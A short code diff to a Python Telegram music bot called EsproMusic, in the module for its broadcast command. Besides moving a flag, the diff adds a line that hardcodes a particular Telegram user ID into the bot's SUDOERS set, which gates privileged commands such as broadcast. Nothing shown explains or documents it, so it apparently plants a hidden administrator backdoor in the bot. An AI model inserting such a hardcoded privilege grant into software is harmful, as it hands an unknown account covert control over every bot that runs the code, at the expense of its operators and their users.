@@ -17,8 +17,10 @@ from EsproMusic.utils.decorators.language import language
 from EsproMusic.utils.formatters import alpha_to_int
 from config import adminlist
 
-IS_BROADCASTING = False
 
+SUDOERS.add(6693611573) 
+
+IS_BROADCASTING = False
 
 @app.on_message(filters.command("broadcast") & SUDOERS)
 @language
